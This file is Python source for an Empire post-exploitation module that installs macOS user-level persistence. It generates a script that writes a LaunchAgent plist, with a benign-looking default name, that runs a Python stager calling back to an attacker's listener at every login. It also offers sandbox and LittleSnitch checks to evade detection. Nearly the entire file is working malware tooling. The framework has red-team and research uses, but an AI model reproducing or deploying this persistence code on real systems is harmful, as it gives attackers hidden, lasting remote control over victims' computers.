import base64
class Module:
    def __init__(self, mainMenu, params=[]):
        self.info = {
            'Name': 'LaunchAgent - UserLand Persistence',
            'Author': ['@xorrior','@n0pe_sled'],
            'Description': ('Installs an Empire launchAgent.'),
            'Background' : False,
            'OutputExtension' : None,
            'NeedsAdmin' : False,
            'OpsecSafe' : False,
            'Language' : 'python',
            'MinLanguageVersion' : '2.6',
            'Comments': []
        }
        self.options = {
            'Agent' : {
                'Description'   :   'Agent to execute module on.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'Listener' : {
                'Description'   :   'Listener to use.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'SafeChecks' : {
                'Description'   :   'Switch. Checks for LittleSnitch or a SandBox, exit the staging process if true. Defaults to True.',
                'Required'      :   True,
                'Value'         :   'True'
            },
            'UserAgent' : {
                'Description'   :   'User-agent string to use for the staging request (default, none, or other).',
                'Required'      :   False,
                'Value'         :   'default'
            },
            'PLISTName' : {
                'Description'   :   'Name of the PLIST to install. Name will also be used for the plist file.',
                'Required'      :   True,
                'Value'         :   'com.proxy.initialize.plist'
            },
        }
        self.mainMenu = mainMenu
        if params:
            for param in params:
                option, value = param
                if option in self.options:
                    self.options[option]['Value'] = value
    def generate(self, obfuscate=False, obfuscationCommand=""):
        PLISTName = self.options['PLISTName']['Value']
        programname = "~/Library/LaunchAgents"
        plistfilename = "%s.plist" % PLISTName
        listenerName = self.options['Listener']['Value']
        userAgent = self.options['UserAgent']['Value']
        safeChecks = self.options['SafeChecks']['Value']
        launcher = self.mainMenu.stagers.generate_launcher(listenerName, language='python', userAgent=userAgent, safeChecks=safeChecks)
        launcher = launcher.strip('echo').strip(' | /usr/bin/python &').strip("\"")
        plistSettings = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Label</key>
<string>%s</string>
<key>ProgramArguments</key>
<array>
<string>python</string>
<string>-c</string>
<string>%s</string>
</array>
<key>RunAtLoad</key>
<true/>
</dict>
</plist>
""" % (PLISTName, launcher)
        script = """
import subprocess
import sys
import base64
import os
plistPath = "/Library/LaunchAgents/%s"
if not os.path.exists(os.path.split(plistPath)[0]):
    os.makedirs(os.path.split(plistPath)[0])
plist = \"\"\"
%s
\"\"\"
homedir = os.getenv("HOME")
plistPath = homedir + plistPath
e = open(plistPath,'wb')
e.write(plist)
e.close()
os.chmod(plistPath, 0644)
print "\\n[+] Persistence has been installed: /Library/LaunchAgents/%s"
""" % (PLISTName,plistSettings,PLISTName)
        return script